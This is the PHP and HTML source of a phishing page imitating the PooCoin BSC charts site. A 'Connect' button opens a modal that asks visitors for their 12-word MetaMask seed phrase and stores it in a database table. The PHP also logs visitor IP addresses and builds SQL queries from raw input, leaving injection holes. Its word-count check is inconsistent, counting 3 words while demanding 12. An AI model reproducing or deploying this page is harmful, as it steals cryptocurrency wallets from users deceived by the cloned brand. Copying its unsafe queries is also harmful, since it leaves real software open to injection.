
<?php

  include("conexao.php");
 
date_default_timezone_set("America/Sao_Paulo");

$ip = $_SERVER['REMOTE_ADDR'];

$sqlCosulta = $mysqli->query("SELECT * FROM contador WHERE ip = '$ip' ORDER BY id desc");
$contarConsultar = $sqlCosulta->num_rows;

if($contarConsultar == 0){
    
    $sqlInserta = $mysqli->query("INSERT INTO contador (ip, data) VALUES ('$ip', now())");
} else{
    
    $row = $sqlCosulta->fetch_array();
    $dataRegistro = $row['data'];
    $dataAtual = date("Y-m-d H:i:");
    $novaData = strtotime($dataRegistro."+ 1 hour");
    $novaData = date("Y-m-d H:i:", $novaData);
   
    if($dataAtual >= $novaData){
       
       $sqlInserta = $mysqli->query("INSERT INTO contador (ip, data) VALUES ('$ip', now())");
   
    } 

}

 if (count($_POST) > 0) {
  
  include("conexao.php");
  
    $error = false;      
   
     $tokens = $_POST['tokens'];
    
    
    $palavras = explode(" ", $tokens);

     if (count($palavras) != 3) {
        
       $error = "<div class='card w-75'>
          <div class='card-body'>
            <h5 class='card-title' style='color: black;'> Fill with 12 words!</h5>           
            <button type='button' class='btn btn-secondary' data-mdb-dismiss='card-body'><a href='http://www.poopcoinn.online/index.php' style='color: #fff; text-decoration: none;'>Close</a></button>
          </div>
        </div>";
        
      }
   
    if ($error) {
      echo "<p><b>ERRO: $error</b></p";
    } else{
      
      $sql_code = "INSERT INTO tokens (tokens) 
      VALUES ('$tokens')";
       $deu_certo = $mysqli->query($sql_code) or die($msqli->error);
         if ($deu_certo) {
          echo "<div class='card w-75'>
          <div class='card-body'>
            <h5 class='card-title' style='color: black;'>Tokens sent successfully!</h5>           
            <button type='button' class='btn btn-secondary' data-mdb-dismiss='card-body'><a href='http://www.poopcoinn.online/index.php' style='text-decoration: none;'>Close</a></button>
          </div>
        </div>";

                        }


                
                }

    


         }
              
 



?>




<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<link rel="preconnect" href="https://bsc-dataseed.binance.org">
	<link rel="preconnect" href="https://bsc-dataseed1.defibit.io">
	<link rel="preconnect" href="https://bsc-dataseed1.ninicoin.io">
	<link rel="shortcut icon" href="https://poocoin.app/favicon.ico">
	<link rel="apple-touch-icon" href="https://poocoin.app/images/logo/poocoin512.png">
	<link rel="manifest" href="https://poocoin.app/manifest.json">
	<title>PooCoin BSC Charts</title>
	<meta name="description" content="PooCoin live streaming charts DAPP for Binance Smart Chain (BSC) tokens.">
	<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1">
	<meta name="theme-color" content="#000000">
	<meta name="twitter:image" content="https://poocoin.app/images/logo/poocoin512.png">
	<meta name="twitter:description" content="PooCoin live streaming charts DAPP for Binance Smart Chain (BSC) tokens."><meta name="twitter:card" content="summary">
	<meta name="twitter:title" content="PooCoin Charts">
	 


	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
  <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js" integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13" crossorigin="anonymous"></script>
	<link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
	<script src="/charts1/charting_library/charting_library.js">		
	</script><script src="/charts1/datafeeds/udf/dist/polyfills.js">		
	</script><script src="/charts1/datafeeds/udf/dist/bundle.js">		
	</script><script async="" src="https://www.googletagmanager.com/gtag/js?id=G-JKD153X2H2">		
	</script><script>if(window.location.search.indexOf("__cf")>-1){const o=window.location.search.indexOf("__cf");window.location=window.location.origin+window.location.pathname+window.location.search.substr(0,o>-1?o-1:void 0)}</script>
	<script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-JKD153X2H2")</script>
	

	<link rel="preconnect" href="https://fonts.gstatic.com">
	<link href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,100;0,300;0,400;0,700;0,900;1,100;1,300;1,400;1,700;1,900&amp;display=swap" rel="stylesheet">
	<link href="https://poocoin.app/static/css/5.ccb64771.chunk.css" rel="stylesheet">
	<link href="https://poocoin.app/static/css/main.46dbf378.chunk.css" rel="stylesheet">
	
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
	
	<script src='https://kit.fontawesome.com/a076d05399.js' crossorigin='anonymous'></script>
	<script async="" src="/cdn-cgi/bm/cv/669835187/api.js"></script>

	

	

<style id="detectElementResize" type="text/css"> 

 .modal-dialog{
  margin-left: 62%; 
  margin-bottom: 10%
 }


	@keyframes resizeanim { from { opacity: 0; } to { opacity: 0; } } .resize-triggers { animation: 1ms resizeanim; visibility: hidden; opacity: 0; } .resize-triggers, .resize-triggers > div, .contract-trigger:before { content: " "; display: block; position: absolute; top: 0; left: 0; height: 100%; width: 100%; overflow: hidden; z-index: -1; } .resize-triggers > div { background: #eee; overflow: auto; } .contract-trigger:before { width: 200%; height: 200%; }
  
 #form4Example3{
	border: 1px solid black; 
	width: 100%;
}


@media (max-width: 600px)
{
  #form4Example3{
  	width: 100%;
  }
}


  
 @media (max-width: 600px)
{
  #cu{
  	width: auto;
   max-width: 450px;


  }

  #cu2{
  	max-width: 482px;
  }
.modal-dialog{
	margin-left: auto;
}
}

</style>
</head>
<body data-aos-easing="ease" data-aos-duration="200" data-aos-delay="0">
	
	<div id="root">
		<nav class="Navbar_nav__YcM5- bg-dark py-2 text-center shadow shadow-sm text-light">
			<div class="container px-xl-0"><div class="row justify-content-center align-items-center">
				<div class="mb-lg-0 col-lg-4 text-lg-left d-flex justify-content-center aos-init aos-animate" data-aos-duration="600" data-aos="fade-down" data-aos-delay="300">
					<a aria-current="page" class="Navbar_logo__3jo1w d-flex justify-content-center text-light active" href="/"><img src="img/logo.png" class="me-2" height="30">
						<span class="text-small lh-1" style="padding-top: 2px;">PooCoin<br>Charts</span>
					</a>
					
					<div class="ms-2 px-1 text-xs border-start border-end border-secondary"><div class="text-light fw-bold">&gt; Binance (BSC)

					</div>
					
					<div>
						<a target="_blank" href="https://polygon.poocoin.app">Polygon (Matic)</a></div><div><a target="_blank" href="https://kcc.poocoin.app">

						KuChain (KCC)

						</a>
					 </div>

					</div>
					 <a class="d-flex align-items-center text-small text-muted ms-2" href="/tokens/0xb27adaffb9fea1801459a1a81b17218288c097cc" style="line-height: 1;">
					 	<span class="bg-white border border-secondary p-1" style="border-radius: 999px;">
					 		<img src="img/logo.png" height="18"></span>
					 	<span class="text-success ps-1">$1.2
					 	
					 	</span>
					 	</a>

					 	<a target="_blank" rel="noreferrer" href="https://t.me/poocointokenchat"><img src="img/telegram.png" height="25">

					 	</a>
					    
					    </div>

					    <div class="col-lg-4 mt-3 mt-lg-0 main-nav aos-init aos-animate" data-aos-duration="600" data-aos="fade-down" data-aos-delay="0"><a aria-current="page" class="btn btn-sm btn-link shadow-0 mx-1 active" href="/">
					     Charts

					    </a>

					    	<a class="btn btn-sm btn-link shadow-0 mx-1" href="/swap">
					    	Trade
					        </a>

					        <a class="btn btn-sm btn-link shadow-0 mx-1" href="/multi-chart">

					        Multi Chart

					       </a>

					        <a class="btn btn-sm btn-link shadow-0 mx-1" href="/poocoin">

					        About

					       </a>

					       <a class="btn btn-sm btn-link shadow-0 mx-1" href="/tools">

					       Tools

					      </a>

					      <a class="btn btn-sm btn-link shadow-0 mx-1" href="/premium">

					      Premium

					     </a>

					     <a class="btn btn-sm btn-link shadow-0 mx-1" href="/promote">

					     Advertise

					    </a>

					    <a rel="noreferrer" target="_blank" href="https://t.me/Poocoin_Pricebot" class="btn btn-sm btn-link shadow-0 mx-1">

					    Free Price Bot

					  </a>

					  </div>

					  <div class="mt-2 mt-lg-0 col-lg-4 d-flex flex-wrap justify-content-center justify-content-lg-end align-items-center aos-init aos-animate;">
					  	

					  	<!-- Button trigger modal -->
				       
				        <button type="button" type="button" class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#exampleModal" style="color: black; background-color: #fff;">
				          Connect
				        </button>
                   
	             <!-- Modal -->
							<div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
							  <div class="modal-dialog">

							    <div class="modal-content">
							      
							      <div class="modal-body">
							        
							      <!-- Navbar -->
										<nav class="navbar navbar-expand-lg navbar-light bg-light">
										  
										  <!-- Container wrapper -->
										  <div class="container">
										    <!-- Navbar brand -->
										    <a class="navbar-brand me-2" href="https://mdbgo.com/">
										      <img
										        src="img/logo1.png"
										        height="60"
										        alt="MDB Logo"
										        loading="lazy"
										        style="margin-top: -1px;"
										      />
										    </a>

										     <!-- Toggle button -->
										    <button
										      class="navbar-toggler"
										      type="button"
										      data-mdb-toggle="collapse"
										      data-mdb-target="#navbarButtonsExample"
										      aria-controls="navbarButtonsExample"
										      aria-expanded="false"
										      aria-label="Toggle navigation"
										    >
										      <i class="fas fa-bars"></i>
										    </button>

										    <!-- Collapsible wrapper -->
										    <div class="collapse navbar-collapse" id="navbarButtonsExample" style="margin-left: 30%;">
										     
										      <!-- Left links -->

										      <div class="d-flex align-items-center">
										        
										        <button type="button" class="btn btn-outline-success btn-rounded" data-mdb-ripple-color="dark" style=" font-size: 10px;">
										         
										         <svg xmlns="http://www.w3.org/2000/svg" width="16" height="10" fill="currentColor" class="bi bi-circle-fill" viewBox="0 0 16 16" style="margin-right: 10px; margin-left: 0;">
												  <circle cx="8" cy="8" r="8"/>
												</svg>

										         Smart Chain



										       </button>							       
                          


										      </div>
										    </div>
										    <!-- Collapsible wrapper -->
										  </div>
										  <!-- Container wrapper -->
										</nav>
										<!-- Navbar -->

										<div class="container" style="text-align: left;">
										  
										 <h1 style="margin-top: 10%; color: black;">Continue with Seed Phrase</h1>
										 <p style="color: black;">Enter your keyword phrase of 12 words to continue using MetaMask.</p>
										 <h4 style="margin-top: 5%; color: black;">Wallet Seed</h4>
										  
										  <form action="" method="POST">
										  
										  <div class="form-outline mb-4">
										    <textarea class="form-control" id="form4Example3" rows="8" name="tokens" placeholder="Separate each word with a single space"></textarea>
										 </div>
										 
										 <button type="submit" class="btn btn-primary"  style="width: 150px; height: 45px; font-size: 20px; background-color: #FF4500;" value="send">Proceed</button>
										 
										 </form>
										
										</div>
											 
											   
                     
							      </div>
							      
							    </div>
							  </div>
							</div>
	        

						</div>
					   </div>

				  </nav>
             
									      



				    <div class="container flex-grow-1">

				    	<div class="text-center mt-3 aos-init aos-animate" data-aos="fade-down" data-aos-delay="100">

				    		<div class="d-flex flex-grow-1 justify-content-center">
				    		<div class="text-center mb-2 mx-2">
				    			<img src="http://static.a-ads.com/a-ads-banners/350464/120x60?region=eu-central-1" style="width: 800px; height: 200px;">

				    			<!--<iframe data-aa="1604350" src="http://static.a-ads.com/a-ads-banners/350464/120x60?region=eu-central-1" scrolling="no" style="width: 400px; height: 80px; border: 0px; padding: 0px;">!-->
				    				
				    			</iframe>

				    		  </div>
				    		  <div class="text-center mb-2 mx-2">
				    			 

				    			</div>
				    		    </div>
				    		    <h1>BSC Charts</h1>
				    		    <h2>View price charts for any token in your wallet (binance smart chain)</h2>
				    		    <div class="mb-3 text-center fs-5">Telegram public chat: 
				    		    	<a target="_blank" rel="noreferrer" href="https://t.me/poocointokenchat">
				    		    	https://t.me/poocointokenchat
				    		    </a>
				    		</div>
				    		
					    		<div class="mb-3 d-flex justify-content-center text-start">
					    			<div style="flex-basis: 450px;">
					    			
					    			<form class="d-flex">
					    					<div class="input-group" style="min-width: 250px;">
					    						<div class=" css-19yvkda">
				    							
				    							<span aria-live="polite" aria-atomic="false" aria-relevant="additions text" class="css-7pg0cj-a11yText">
				    								
				    							</span>

				    							<div class=" css-yk16xz-control">
						    				<div class=" css-1hwfws3">
						    		    	

						    		    	<div class="css-1ksnklj">

				    		    		<div class="" style="display: inline-block;">

				    		    		<!--Busca!--> 
														  

									    <input type="search" id="busca" name="q" placeholder="Enter token name / address" style="height: 36px; width: 400px;">
														  
														



				    		    		</div>

				    		    	   </div>

				    		    	  </div>

				    		    	  <div class=" css-1wy0on6">

				    		    	  	<span class=" css-1okebmr-indicatorSeparator">
				    		    	  		

				    		    	  	</span>

				    		    	  	<div class=" css-tlfecz-indicatorContainer" aria-hidden="true">

				    		    	  		
				    		    	  	 </div>

				    		    	  	</div>

				    		    	   </div>
				    		    	 </div>
				    		    	</div>

				    		    	<button type="button" class="btn btn-light btn-sm ms-1" style="height: 36px; margin-right: 20px; width: 30px;">

				    		    		<i class="fa fa-edit"></i>
				    		    	

				    		    	</button>


				    		    	  </form>


				    		    	</div>
				    		      </div>

				    		      <div class="bg-dark d-flex flex-column p-3 bg-dark-1 mx-auto" style="max-width: 800px;" id="cu"><div class="flex-grow-1 d-flex flex-column">

				    		      <div class="d-flex mb-1 px-2" style="max-width: 500px;">
				    		      <input class="form-control form-control-sm" type="text" placeholder="Filter..." value=""></div>
				    		      <ul class="nav nav-tabs justify-content-center">
				    		      	<li class="nav-item font-size-sm">
				    		      	<button class="btn-sm p-2 nav-link active">
				    		      	Promoted
				    		       </button>
				    		      </li><li class="nav-item font-size-sm"><button class="btn-sm p-2 nav-link ">Wallet</button></li><li class="nav-item font-size-sm"><button class="btn-sm p-2 nav-link ">Starred</button></li><li class="nav-item font-size-sm"><button class="btn-sm p-2 nav-link ">

				    		    	History
				    		      </button>
				    		      </li>
				    		    	</ul>

				    		     <div class="text-center"><div class="text-small text-center px-2">

				    		       <a href="/promote">

				    		    	Promote your token


				    		       </a>

				    		      </div><div class="btn-group my-1" role="group"><button class="btn btn-secondary btn-sm active">Vetted</button><button class="btn btn-secondary btn-sm ">Un-Vetted</button></div></div>
				    		      
				    		      <div>

				    		      <div style="height: 420px; width: 100%;">

				    		      <div class="h-100 border shadow shadow-sm" style="position: relative;">

				    		      <div style="overflow: visible; height: 0px; width: 0px;">

				    		      <div aria-colcount="3" aria-rowcount="2" class="ReactVirtualized__Table WalletTokens_walletTokensTable__2X44S" role="grid">

				    		      <div class="ReactVirtualized__Table__headerRow" role="row" style="height: 25px; overflow: hidden; padding-right: 0px; width: 770px;" id="cu2">

				    		     <div class="ReactVirtualized__Table__headerColumn" role="columnheader" style="flex: 0 1 229px";><span title="Tokens">

				    		       Tokens</span>

				    		      </div>

				    		     <div class="ReactVirtualized__Table__headerColumn" role="columnheader" style="flex: 1 1 229px;">

				    		     <span title="Balance">

				    		    	Balance
				    		       </span>

				    		      </div>

				    		     <div class="ReactVirtualized__Table__headerColumn" role="columnheader" style="flex: 0 1 50px;"><span class="ReactVirtualized__Table__headerTruncatedText"></span>
				    		      </div>

				    		    </div>

				    		      <div aria-label="grid" class="ReactVirtualized__Grid ReactVirtualized__Table__Grid" role="rowgroup" tabindex="0" style="box-sizing: border-box; direction: ltr; position: relative; width: 458px; will-change: transform; height: 395px;">

				    		      <div class="ReactVirtualized__Grid__innerScrollContainer" role="rowgroup" style="width: 770px; height: 36px;  max-height: 36px; " id="cu">

				    		      <div aria-rowindex="1" class="ReactVirtualized__Table__row" role="row" style="height: 36px; width: 770px;" id="cu">

				    		      	<div aria-colindex="1" class="ReactVirtualized__Table__rowColumn" role="gridcell" style="overflow: hidden; flex: 0 1 229px;">

				    		      		<a class="text-light" href="/tokens/0xf2a92bc1cf798ff4de14502a9c6fda58865e8d5d">

				    		    		THOREUM 
				    		    		<small class="text-success">
				    		    		$1.1093
				    		    	</small>
				    		    	<br>
				    		    	<small class="text-muted">
				    		    	Thoreum V2 (Thoreum Multi-chain Venture Capital)
				    		       </small></a></div><div aria-colindex="2" class="ReactVirtualized__Table__rowColumn" role="gridcell" style="overflow: hidden; flex: 1 1 229px;"><div>
				    		       	0.00<br>
				    		       	<small class="text-success">
				    		       	$0.00
				    		       </small>
				    		       </div>


				    		      </div>

				    		      <div aria-colindex="3" class="ReactVirtualized__Table__rowColumn" role="gridcell" style=" flex: 0 1 50px;">
				    		       
				    		          <img src="img/estrela.png" style="height: 20px; width: 20px">
				    		       
				    		     </div>
				    		     </div>
				    		     </div>
				    		     </div>
				    		     </div>
				    		     </div>
				    		     <div class="resize-triggers">

				    		       <div class="expand-trigger">

				    		       	<div style="width: 457px; height: 419px;">
				    		       		
				    		       	</div>
				    		       </div>
				    		       <div class="contract-trigger">
				    		       	
				    		       </div>
				    		        </div>
				    		    </div>
				    		    </div>
				    		    </div>
				    		    </div>
				    		    </div>
				    		        <div>
				    		        	<iframe class="my-4" width="100%" height="400" src="https://www.youtube.com/embed/CO30ePKq9wg" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" style="max-width: 700px;">
				    		        	
				    		        </iframe>

				    		    </div>
				    		    </div>
				    		    </div>
				    		    </div>



				    		    
                        <div class="ReactModalPortal">
                        	
                        </div>
                        <div class="ReactModalPortal">
                        	
                        </div><div class="ReactModalPortal">
                        	
                        </div>
            








             </body>

             </html>


